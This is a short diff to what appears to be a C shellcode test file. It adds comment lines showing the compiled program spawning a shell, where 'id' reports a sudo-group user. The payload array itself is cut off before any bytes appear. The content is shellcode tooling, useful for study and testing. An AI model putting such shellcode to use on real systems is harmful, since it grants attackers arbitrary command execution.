@@ -4,6 +4,10 @@
  by vold (sysh0ck)
  para executar em sistema de 64 bits
  gcc -W -o shellcode xxx.c -32
+ sysh0ck@PC:~/vold (master) $ ./shellcode
+ $
+ $ id
+ $ uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),27(sudo),1001(rvm)
  */
  #include <stdio.h>
  unsigned const char vold[] = 
